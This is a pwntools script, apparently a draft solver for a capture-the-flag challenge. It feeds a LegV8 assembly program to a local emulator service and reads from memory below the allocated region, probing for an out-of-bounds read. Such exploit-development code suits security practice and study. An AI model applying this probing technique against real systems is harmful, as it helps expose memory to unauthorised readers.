from pwn import *
from assembler import *

p = remote('localhost', 5001)
# p = process('./chall_patched')
p.sendlineafter(b'How much memory do you want for your program?', b'1000')
p.recvuntil(b'[')
mem_start = int(p.recvuntil(b',', drop=True), 16)
log.info(f'{hex(mem_start) = }')

reg = [0]*31
assembly_code = ""

reg[2] = 1
reg[1] = 10
reg[10] = mem_start
assembly_code += """
    ORR X0, XZR, XZR    // sum = 0
LOOP:
    ADD X0, X0, X1      // sum = sum + counter
    SUB X1, X1, X2      // counter = counter - 1 (using X2 as 1)
    CBZ X1, END         // if counter is zero, go to end.
    CBZ XZR, LOOP       // always jump to LOOP if reach this line

END:
    STUR X0, [X10, #8]     // save sum to 0x50008
    LDUR X1, [X10, #-200]  // X1 = *(long*)(X10 - 200)
"""

p.sendlineafter(b'Do you want to set initial values for registers?', b'y')
for i in range(31):
    p.sendlineafter(b'=', str(reg[i]).encode())

assembler = LegV8Assembler()
try:
    binary_code_bytes = assembler.assemble_bytes(assembly_code)
except ValueError as e:
    print(f"Assembly Failed: {e}")


p.sendlineafter(b'Enter your program', binary_code_bytes)
p.interactive()
